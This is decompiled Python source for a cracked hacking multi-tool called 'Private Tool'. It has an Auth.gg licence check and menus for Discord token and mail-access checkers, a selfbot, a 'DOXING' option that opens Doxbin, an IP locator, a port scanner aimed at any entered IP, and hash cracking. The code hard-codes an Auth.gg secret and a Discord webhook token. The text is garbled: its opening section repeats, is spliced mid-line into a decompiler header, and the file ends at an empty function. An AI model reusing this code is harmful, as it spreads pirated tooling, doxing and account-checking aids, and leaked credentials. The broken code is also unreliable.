import colorama, discord
from discord.ext import commands, tasks
from colorama import Fore
import subprocess, asyncio, functools, os, aiohttp, sys, attr
from bs4 import BeautifulSoup
import random, string, ctypes, time, socket, hashlib
from dhooks import Webhook
import requests, json, platform, webbrowser
from urllib.request import urlopen
import os, time, sys
from colorama import Fore
import os.path, requests, random, threading
emails = []
passwords = []
proxyy = []
checked = 0
cpm1 = 0
cpm2 = 0
error = 0
proxy = ''
good = 0
bad = 0
subprocess.call('', shell=True)
os.system('cls && title Private-Tool')

def Authgg():
    try:
        import requests, subprocess, tkinter
        from tkinter import messagebox
        import sys, hashlib
    except Exception as e:
        try:
            print(f"Error -> {e}")
            time.sleep(2)
            os._exit(0)
        finally:
            e = None
            del e

    else:
        root = tkinter.Tk()
        root.withdraw()
        hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
        BUF_SIZE = 65536
        md5 = hashlib.md5()# uncompyle6 version 3.7.3
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]
# Embedded file name: private.py
import colorama, discord
from discord.ext import commands, tasks
from colorama import Fore
import subprocess, asyncio, functools, os, aiohttp, sys, attr
from bs4 import BeautifulSoup
import random, string, ctypes, time, socket, hashlib
from dhooks import Webhook
import requests, json, platform, webbrowser
from urllib.request import urlopen
import os, time, sys
from colorama import Fore
from colored import fg
import os.path, requests, random, threading
emails = []
passwords = []
proxyy = []
checked = 0
cpm1 = 0
cpm2 = 0
error = 0
proxy = ''
good = 0
bad = 0
subprocess.call('', shell=True)
os.system('cls && title Private-Tool')
colortouse = fg("light_green_2")
def Authgg():
    try:
        import requests, subprocess, tkinter
        from tkinter import messagebox
        import sys, hashlib
    except Exception as e:
        try:
            print(f"Error -> {e}")
            time.sleep(2)
            os._exit(0)
        finally:
            e = None
            del e

    else:
        root = tkinter.Tk()
        root.withdraw()
        hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
        BUF_SIZE = 65536
        md5 = hashlib.md5()
        clear = lambda : os.system('cls')
        try:
            with open(sys.argv[0], 'rb') as (f):
                while True:
                    data = f.read(BUF_SIZE)
                    if not data:
                        break
                    md5.update(data)

        except:
            messagebox.showerror('Auth.GG | Licensing System', 'Hash Calculating Failed')
            os._exit(0)
        else:
            filehash = md5.hexdigest()
            login_status = 0
            register_status = 0
            apikey = 'UPDATE_ME'
            secret = 'hPZUgko7rAqBCCvlqQQvI8BDkL8ghV3UesK'
            aid = '259755'
            version = '1.0'
            random = 'your random code here'

            def main():
                clear()
                print("\n                                             _   _      _____           _                 \n                                  /\\        | | | |    / ____|         | |                \n                                 /  \\  _   _| |_| |__ | (___  _   _ ___| |_ ___ _ __ ___  \n                                / /\\ \\| | | | __| '_ \\ \\___ \\| | | / __| __/ _ \\ '_ ` _ \\ \n                               / ____ \\ |_| | |_| | | |____) | |_| \\__ \\ ||  __/ | | | | |\n                              /_/    \\_\\__,_|\\__|_| |_|_____/ \\__, |___/\\__\\___|_| |_| |_|\n                                                               __/ |                      \n                                                              |___/                       \n\n            ")
                os.system('title Auth Menu')
                print('[1] Login')
                print('[2] Register')
                print('[3] Redeem (extend subscription)')
                option = input('\n> ')
                if option == '1':
                    login()
                else:
                    if option == '2':
                        register()
                    else:
                        if option == '3':
                            redeem()
                        else:
                            print('\n[!] Invalid Option')
                            time.sleep(2)
                            main()

            def integrity_check():
                headers = {'User-Agent': 'AuthGG'}
                data = {'type':'start',
                 'random':random,
                 'secret':secret,
                 'aid':aid,
                 'apikey':apikey}

            def login():
                if login_status == 0:
                    os.system('cls')
                    os.system('title Login Menu')
                    username = input('[?] Enter Username: ')
                    password = input('[?] Enter Password: ')
                    data = {'type':'login',
                     'aid':aid,
                     'random':random,
                     'apikey':apikey,
                     'secret':secret,
                     'username':username,
                     'password':password,
                     'hwid':hwid}
                    headers = {'User-Agent': 'AuthGG'}
                    try:
                        with requests.Session() as (sess):
                            sess.trust_env = False
                            request_2 = sess.post('https://api.auth.gg/version2/api.php', verify=False, headers=headers, data=data)
                            response_2 = request_2.text
                            flag2 = response_2 == request_2.text
                            if flag2:
                                if 'success' in response_2:
                                    print('\n[!] Welcome back, {}!'.format(username))
                                    time.sleep(2)
                                else:
                                    if 'invalid_details' in response_2:
                                        print('\n[!] Wrong username/password')
                                    else:
                                        if 'invalid_hwid' in response_2:
                                            print('\n[!] Invalid HWID, please do not attempt to share accounts!')
                                        else:
                                            if 'hwid_updated' in response_2:
                                                print('\n[!] Your HWID has been updated, relogin!')
                                            else:
                                                if 'time_expired' in response_2:
                                                    print('\n[!] Your subscription has expired!')
                                                else:
                                                    if 'net_error' in response_2:
                                                        print('\n[!] Something went wrong!')
                                                    else:
                                                        print('\n[!] Something went wrong!')
                                    time.sleep(2)
                                    os._exit(0)
                            else:
                                os._exit(0)
                    except:
                        messagebox.showerror('Auth.GG Licensing System', 'Something went wrong!')
                        os._exit(0)

                else:
                    messagebox.showerror('Auth.GG Licensing System', 'Login is not available at this time!')
                    os._exit(0)

            def register():
                os.system('cls')
                os.system('title Register Menu')
                if register_status == 0:
                    token = input('[?] Please enter token: ')
                    email = input('[?] Please enter email: ')
                    username = input('[?] Please enter username: ')
                    password = input('[?] Please enter password: ')
                    headers = {'User-Agent': 'AuthGG'}
                    data = {'type':'register',
                     'aid':aid,
                     'random':random,
                     'apikey':apikey,
                     'secret':secret,
                     'username':username,
                     'password':password,
                     'email':email,
                     'token':token,
                     'hwid':hwid}
                    try:
                        with requests.Session() as (sess):
                            sess.trust_env = False
                            request_3 = sess.post('https://api.auth.gg/version2/api.php', verify=False, data=data, headers=headers)
                            response_3 = request_3.text
                            flag3 = response_3 == request_3.text
                            if flag3:
                                if 'success' in response_3:
                                    print('\n[!] {}, you have successfully registered!'.format(username))
                                    time.sleep(2)
                                    os._exit(0)
                                else:
                                    if 'invalid_token' in response_3:
                                        print('\n[!] Token invalid or already used')
                                    else:
                                        if 'invalid_username' in response_3:
                                            print('\n[!] Username already taken, please choose another one')
                                        else:
                                            if 'email_used' in response_3:
                                                print('\n[!] Email is invalid or in use!')
                                            else:
                                                print('\n[!] Something went wrong!')
                                    time.sleep(2)
                                    os._exit(0)
                            else:
                                os._exit(0)
                    except:
                        messagebox.showerror('Auth.GG Licensing System', 'Something went wrong!')
                        os._exit(0)

                else:
                    messagebox.showerror('Auth.GG Licensing System', 'Register is not available at this time!')
                    os._exit(0)

            def redeem():
                os.system('cls')
                os.system('title Redeem Menu')
                username = input('[?] Enter Username: ')
                password = input('[?] Enter Password: ')
                token = input('[?] Please enter token: ')
                headers = {'User-Agent': 'AuthGG'}
                data = {'type':'redeem',
                 'aid':aid,
                 'random':random,
                 'apikey':apikey,
                 'secret':secret,
                 'username':username,
                 'password':password,
                 'token':token}
                try:
                    with requests.Session() as (sess):
                        sess.trust_env = False
                        request_4 = sess.post('https://api.auth.gg/version2/api.php', verify=False, data=data, headers=headers)
                        response_4 = request_4.text
                        flag4 = response_4 == request_4.text
                        if flag4:
                            if 'success' in response_4:
                                print('\n[!] Successfully redeemed license & extended subscription!')
                            else:
                                if 'invalid_token' in response_4:
                                    print('\n[!] Invalid Credentials!')
                                else:
                                    if 'net_error' in response_4:
                                        print('\n[!] Something went wrong!')
                            time.sleep(2)
                            os._exit(0)
                        else:
                            os._exit(0)
                except:
                    messagebox.showerror('Auth.GG Licensing System', 'Something went wrong!')
                    os._exit(0)

            integrity_check()
            main()



def printSlow(text):
    for char in text:
        print(char, end='')
        sys.stdout.flush()
        time.sleep(0.05)


def check():
    if os.path.isfile('colorsettings.json'):
        getapi()
    else:
        Color()


def getapi():
    with open('colorsettings.json') as (f):
        config = json.load(f)
    color = config.get('color')
    if config.get('color') == 'RED':
        nicecolor = Fore.RED
    else:
        if config.get('color') == 'BLUE':
            nicecolor = Fore.BLUE
        else:
            if config.get('color') == 'GREEN':
                nicecolor = Fore.GREEN
            else:
                if config.get('color') == 'YELLOW':
                    nicecolor = Fore.YELLOW
                else:
                    if config.get('color') == 'MAGENTA':
                        nicecolor = Fore.MAGENTA
                    else:
                        if config.get('color') == 'CYAN':
                            nicecolor = Fore.CYAN
                        else:
                            if config.get('color') == 'WHITE':
                                nicecolor = Fore.WHITE
                            else:
                                if config.get('color') == 'LIGHTRED':
                                    nicecolor = Fore.LIGHTRED_EX
                                else:
                                    if config.get('color') == 'LIGHTBLUE':
                                        nicecolor = Fore.LIGHTBLUE_EX
                                    else:
                                        if config.get('color') == 'LIGHTGREEN':
                                            nicecolor = Fore.LIGHTGREEN_EX
                                        else:
                                            if config.get('color') == 'LIGHTYELLOW':
                                                nicecolor = Fore.LIGHTYELLOW_EX
                                            else:
                                                if config.get('color') == 'LIGHTMAGENTA':
                                                    nicecolor = Fore.LIGHTMAGENTA_EX
                                                else:
                                                    if config.get('color') == 'LIGHTCYAN':
                                                        nicecolor = Fore.LIGHTCYAN_EX
                                                    else:
                                                        if config.get('color') == 'LIGHTWHITE':
                                                            nicecolor = Fore.LIGHTWHITE_EX
                                                        else:
                                                            if config.get('color') == 'LIGHTBLACK':
                                                                nicecolor = Fore.LIGHTBLACK_EX
                                                            os.system('cls')
                                                            print(nicecolor)


def Color():
    os.system('cls && title Choose-Color')
    print("Choose one of the following Color's for the Menu design!")
    print('')
    print('')
    print(Fore.BLUE + 'BLUE  ' + Fore.LIGHTBLUE_EX + '     LIGHTBLUE')
    print(Fore.RED + 'RED  ' + Fore.LIGHTRED_EX + '      LIGHTRED')
    print(Fore.GREEN + 'GREEN  ' + Fore.LIGHTGREEN_EX + '    LIGHTGREEN')
    print(Fore.YELLOW + 'YELLOW  ' + Fore.LIGHTYELLOW_EX + '   LIGHTYELLOW')
    print(Fore.WHITE + 'WHITE  ' + Fore.LIGHTWHITE_EX + '    LIGHTWHITE')
    print(Fore.MAGENTA + 'MAGENTA  ' + Fore.LIGHTMAGENTA_EX + '  LIGHTMAGENTA')
    print(Fore.CYAN + 'CYAN  ' + Fore.LIGHTCYAN_EX + '     LIGHTCYAN')
    print(Fore.LIGHTBLACK_EX + '           LIGHTBLACK')
    print('')
    print('')
    color = input('> ')
    c = {'color': color}
    with open('colorsettings.json', 'w', encoding='utf8') as (json_file):
        json.dump(c, json_file, ensure_ascii=True)
    os.close()


check()
crackedby = "Cracked by Akiko and Vanix"
time.sleep(1)
def Design():
    ctypes.windll.kernel32.SetConsoleTitleW("Private Tool Cracked by Akiko and Vanix")
    print(colortouse + crackedby + '    \n                                ██▓███   ██▀███   ██▓ ██▒   █▓ ▄▄▄     ▄▄▄█████▓▓█████             \n                               ▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▒████▄   ▓  ██▒ ▓▒▓█   ▀       \n                               ▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒██  ▀█▄ ▒ ▓██░ ▒░▒███          \n                               ▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄      \n                               ▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░   ▓█   ▓██▒ ▒██▒ ░ ░▒████▒      \n                               ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░   ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░      \n                               ░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░    ▒   ▒▒ ░   ░     ░ ░  ░      \n                               ░░         ░░   ░  ▒ ░     ░░    ░   ▒    ░         ░         \n                                           ░      ░        ░        ░  ░           ░  ░\n                                                           ░                                       \n                ')


def Modules():
    print('                                    ╔══════════════════════════════════════════╗\n                                    ║{1} GetAccess    {4} DISCORD  {7} NETWORK ║\n                                    ║{2} CHECKER      {5} DOXING   {8} SCANNER ║\n                                    ║{3} ProxyScraper {6} HASHING  {9} COLOR   ║\n                                    ╚══════════════════════════════════════════╝\n    ')
    answer = input(Fore.LIGHTWHITE_EX + '> ')
    if answer == '1':
        os.system("cls && title GET ACCESS TO PREMIUM FUNCTION'S")
        GetAccess()
    else:
        if answer == '2':
            os.system('cls && title CHECKER')
            CheckerClass()
        else:
            if answer == '3':
                os.system('cls && title ProxyScraper')
                ProxyScraper()
            else:
                if answer == '4':
                    os.system('cls && title DISCORD')
                    DiscordClass()
                else:
                    if answer == '5':
                        os.system('cls && title DOXING')
                        DoxingClass()
                    else:
                        if answer == '6':
                            os.system('cls && title HASHING')
                            HashingClass()
                        else:
                            if answer == '7':
                                os.system('cls && title NETWORK')
                                NetworkClass()
                            else:
                                if answer == '8':
                                    os.system('cls && title SCANNER')
                                    ScannerClass()
                                else:
                                    if answer == '9':
                                        ColorChanger()
                                    else:
                                        print('Wrong Number')
                                        os.system('cls && title Private Tool')
                                        getapi()


def GetAccess():
    print(Fore.LIGHTGREEN_EX)
    print('\n   __________________   ___   ____________________________\n  / ____/ ____/_  __/  /   | / ____/ ____/ ____/ ___/ ___/\n / / __/ __/   / /    / /| |/ /   / /   / __/  \\__ \\__ \\ \n/ /_/ / /___  / /    / ___ / /___/ /___/ /___ ___/ /__/ / \n\\____/_____/ /_/    /_/  |_\\____/\\____/_____//____/____/  \n                                                          \n                                                        \n    ')
    time.sleep(5)
    anfangscode = '03599'
    one = str(random.randint(1, 9))
    two = str(random.randint(1, 9))
    three = str(random.randint(1, 9))
    four = str(random.randint(1, 9))
    five = str(random.randint(1, 9))
    six = str(random.randint(1, 9))
    seven = str(random.randint(1, 9))
    eight = str(random.randint(1, 9))
    nine = str(random.randint(1, 9))
    ten = str(random.randint(1, 9))
    key = anfangscode + one + two + three + four + five + six + seven + eight + nine + ten
    print('')
    print('')
    printSlow(Fore.LIGHTGREEN_EX + 'Your Key is: ' + Fore.RED + str(key))
    print('')
    print('')
    print('')
    name = input('What is your ' + Fore.LIGHTCYAN_EX + 'Discord ' + Fore.RED + 'Name: ')
    print('Okay ' + name + ' It can take up to 24 Hours!')
    hook = Webhook('https://discordapp.com/api/webhooks/744271841845182564/NikuyqFBNsS9aS4uCkTr4eXroHp8SksKOKCNvfpfp3ZznWLumBD1Y2-E_n2dGVO0bhaD')
    hook.send('Name: ' + name + ' The Key: ' + key)
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')


def CheckerClass():
    print(Fore.LIGHTGREEN_EX)
    print('P    \n                                 ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  \n                                ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒\n                                ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒\n                                ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  \n                                ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒\n                                ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░\n                                  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░\n                                ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ \n                                ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     \n                                ░                       ░                               \n                \n\n                                        ╔═════════════════════════════════════════╗\n                                        ║ {1} TokenChecker {3} MailAccessChecker  ║\n                                        ║ {2} ProxyChecker                        ║\n                                        ╚═════════════════════════════════════════╝\n\n    \n    ')
    antwort = input('> ')
    if antwort == '1':
        tokencheckertokentxt()
    else:
        if antwort == '2':
            ProxyChecker()
        else:
            if antwort == '3':
                MailAccessChecker()


def DiscordClass():
    print(Fore.LIGHTBLUE_EX)
    print('P    \n                             ▓█████▄  ██▓  ██████  ▄████▄   ▒█████   ██▀███  ▓█████▄ \n                             ▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌\n                             ░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌\n                             ░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌\n                             ░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓ \n                              ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒ \n                              ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒ \n                              ░ ░  ░  ▒ ░░  ░  ░  ░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░ \n                                ░     ░        ░  ░ ░          ░ ░     ░        ░    \n                              ░                   ░                           ░      \n\n\n                                      ╔════════════════════════════════════╗\n                                      ║ {1} SelfBot      {2} ControlBots   ║\n                                      ╚════════════════════════════════════╝\n\n    ')
    antwort = input('> ')
    if antwort == '1':
        SelfBot()
    else:
        if antwort == '2':
            ControlDCBot()


def DoxingClass():
    Fore.LIGHTBLACK_EX
    print('P       \n                                 ▓█████▄  ▒█████  ▒██   ██▒ ██▓ ███▄    █   ▄████ \n                                 ▒██▀ ██▌▒██▒  ██▒▒▒ █ █ ▒░▓██▒ ██ ▀█   █  ██▒ ▀█▒\n                                 ░██   █▌▒██░  ██▒░░  █   ░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░\n                                 ░▓█▄   ▌▒██   ██░ ░ █ █ ▒ ░██░▓██▒  ▐▌██▒░▓█  ██▓\n                                 ░▒████▓ ░ ████▓▒░▒██▒ ▒██▒░██░▒██░   ▓██░░▒▓███▀▒\n                                 ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒ \n                                 ░ ▒  ▒   ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ \n                                 ░ ░  ░ ░ ░ ░ ▒   ░    ░   ▒ ░   ░   ░ ░ ░ ░   ░ \n                                   ░        ░ ░   ░    ░   ░           ░       ░                                          \n\n\n                                      ╔════════════════════════════════════╗\n                                      ║ {1} Search Username on Internet    ║\n                                      ║ {2} Opens Doxbin                   ║\n                                      ╚════════════════════════════════════╝\n    \n    ')
    antwort = input('> ')
    if antwort == '1':
        DoxTool()
    else:
        if antwort == '2':
            webbrowser.open_new_tab('https://doxbin.org/')


def HashingClass():
    print(Fore.YELLOW)
    print('P\n                              ██░ ██  ▄▄▄        ██████  ██░ ██  ██▓ ███▄    █   ▄████ \n                             ▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒\n                             ▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░\n                             ░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓\n                             ░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒\n                              ▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ \n                              ▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ \n                              ░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░ \n                              ░  ░  ░      ░  ░      ░   ░  ░  ░ ░           ░       ░ \n                                                          \n                                         ╔════════════════════════════════════╗\n                                         ║ {1} HashConverter                  ║\n                                         ║ {2} HashCracker                    ║\n                                         ╚════════════════════════════════════╝\n\n        ')
    antwort = input('> ')
    if antwort == '1':
        Hashconverter()
    else:
        if antwort == '2':
            HashCracker()


def NetworkClass():
    print(Fore.LIGHTWHITE_EX)
    print('P\n                              ███▄    █ ▓█████▄▄▄█████▓ █     █░ ▒█████   ██▀███   ██ ▄█▀\n                              ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ \n                             ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ \n                             ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ \n                             ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄\n                             ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒\n                             ░ ░░   ░ ▒░ ░ ░  ░   ░      ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░\n                                ░   ░ ░    ░    ░        ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ \n                                      ░    ░  ░            ░        ░ ░     ░     ░  ░   \n                                                            \n                                           ╔════════════════════════════════════╗\n                                           ║ {1} Server        {3} ShowSiteIP   ║\n                                           ║ {2} IP-LOCATOR    {4} ShowSiteSrc  ║\n                                           ╚════════════════════════════════════╝\n\n        ')
    antwort = input('> ')
    if antwort == '1':
        Server()
    else:
        if antwort == '2':
            locator()
        else:
            if antwort == '3':
                IPWebsite()
            else:
                if antwort == '4':
                    WebSiteSRC()


def ScannerClass():
    print(Fore.LIGHTYELLOW_EX)
    print('P\n                               ██████  ▄████▄   ▄▄▄       ███▄    █  ███▄    █ ▓█████  ██▀███  \n                             ▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒\n                             ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒\n                               ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  \n                             ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒\n                             ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░\n                             ░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░\n                             ░  ░  ░  ░          ░   ▒      ░   ░ ░    ░   ░ ░    ░     ░░   ░ \n                                   ░  ░ ░            ░  ░         ░          ░    ░  ░   ░     \n                                      ░                                                        \n\n                                           ╔═══════════════════════════════════╗\n                                           ║          {1} PortScanner          ║\n                                           ╚═══════════════════════════════════╝\n\n\n        ')
    antwort = input('> ')
    if antwort == '1':
        PortScanner()


def NetworkInformation():
    os.system('cls && title Network-Information')
    link = 'https://api.ipify.org/'
    getlink = requests.get(link)
    officialip = str(getlink.text)
    print('Official-IPv4: ' + officialip)
    print('')
    print('private-ip: ' + socket.gethostbyname(socket.gethostname()))


def PcInformation():
    os.system('cls && title Pc-Information')
    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    computername = socket.gethostname()
    computerversion = platform.version()
    computerplatform = platform.platform()
    computersystem = platform.system()
    computermachine = platform.machine()
    print('')
    printSlow(Fore.LIGHTGREEN_EX + 'Your PC Information: \n')
    print('Your Computer-Name: ' + computername)
    print('')
    print('Your HWID: ' + hwid)
    print('')
    print('Your Computer-Version: ' + computerversion)
    print('')
    print('Your Computer-Platform: ' + computerplatform)
    print('')
    print('Your ComputerSystem: ' + computersystem)
    print('')
    print('Your Computer-Machine: ' + computermachine)
    print('')
    print('')
    print(Fore.LIGHTWHITE_EX + 'Do you want to know something of your Internet: ')
    print(Fore.LIGHTYELLOW_EX + 'yes' + Fore.LIGHTBLACK_EX + ' or' + Fore.LIGHTCYAN_EX + ' no')
    networkinfos = input('> ')
    if networkinfos == 'yes':
        NetworkInformation()
    else:
        if networkinfos == 'no':
            print('Okay')
            time.sleep(1)
        else:
            os.close()


def PortScanner():
    target = input("Enter the Target's IP: ")
    for ports in range(1, 65000):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c = s.connect_ex((target, ports))
        if c == 0:
            print(str(ports) + ': Open')


def locator():
    os.system('cls && title IP-Locator')
    print('P    \n                              ██▓ ██▓███   ██▓     ▒█████   ▄████▄   ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  \n                             ▓██▒▓██░  ██▒▓██▒    ▒██▒  ██▒▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒\n                             ▒██▒▓██░ ██▓▒▒██░    ▒██░  ██▒▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒\n                             ░██░▒██▄█▓▒ ▒▒██░    ▒██   ██░▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  \n                             ░██░▒██▒ ░  ░░██████▒░ ████▓▒░▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒\n                             ░▓  ▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░\n                              ▒ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░  ▒     ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░\n                              ▒ ░░░         ░ ░   ░ ░ ░ ▒  ░          ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ \n                              ░               ░  ░    ░ ░  ░ ░            ░  ░            ░ ░     ░     \n                              ░                                            \n\n    \n    ')
    while True:
        ip = input(Fore.LIGHTWHITE_EX + 'Enter IP Address: ')
        api = 'http://ip-api.com/json/'
        apisite = urlopen(api + ip)
        api = apisite.read()
        apidatas = json.loads(api)
        print(Fore.LIGHTBLUE_EX)
        print(Fore.LIGHTGREEN_EX + '               IP: ' + apidatas['query'])
        print(Fore.LIGHTGREEN_EX + '               Status: ' + apidatas['status'])
        print(Fore.LIGHTGREEN_EX + '               Country: ' + apidatas['country'])
        print(Fore.LIGHTGREEN_EX + '               Region: ' + apidatas['regionName'])
        print(Fore.LIGHTGREEN_EX + '               City: ' + apidatas['city'])
        print(Fore.LIGHTGREEN_EX + '               ZIPCODE: ' + apidatas['zip'])
        print(Fore.LIGHTGREEN_EX + '               InternetHoster: ' + apidatas['isp'])
        print(Fore.LIGHTGREEN_EX + '               TimeZone: ' + apidatas['timezone'])
        print('')
        print('')
        print('')
        print('')
        break


def WebSiteSRC():
    site = input(Fore.LIGHTWHITE_EX + 'Enter Website-Link: ')
    r = requests.get(site)
    print(r.content)


def IPWebsite():
    site = input('Enter Website-Name: ')
    r = socket.gethostbyname(site)
    print('The IP: ' + r)


def MD5():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    print('')
    md5 = hashlib.md5(hashconverter.encode())
    print('The hashed word is: ' + md5.hexdigest())


def SHA1():
    hashconverter = input('enter word: ')
    sha1 = hashlib.sha1(hashconverter.encode())
    print('The hashed word is: ' + sha1.hexdigest())


def SHA224():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    sha224 = hashlib.sha224(hashconverter.encode())
    print('The hashed word is: ' + sha224.hexdigest())


def SHA256():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    sha256 = hashlib.sha256(hashconverter.encode())
    print('The hashed word is: ' + sha256.hexdigest())


def SHA384():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    sha384 = hashlib.sha384(hashconverter.encode())
    print('The hashed word is: ' + sha384.hexdigest())


def SHA512():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    sha512 = hashlib.sha512(hashconverter.encode())
    print('The hashed word is: ' + sha512.hexdigest())


def Hashconverter():
    print('Choose one ' + Fore.LIGHTWHITE_EX + 'Converter: ')
    printSlow(Fore.YELLOW + '[MD5 - SHA1 - SHA224 - SHA256 - SHA384 - SHA512]')
    print('')
    answer = input(Fore.LIGHTBLACK_EX + '> ')
    if answer == 'MD5':
        MD5()
    else:
        if answer == 'SHA1':
            SHA1()
        else:
            if answer == 'SHA224':
                SHA224()
            else:
                if answer == 'SHA256':
                    SHA256()
                else:
                    if answer == 'SHA384':
                        SHA384()
                    else:
                        if answer == 'SHA512':
                            SHA512()


def HashCracker():
    flag = 0
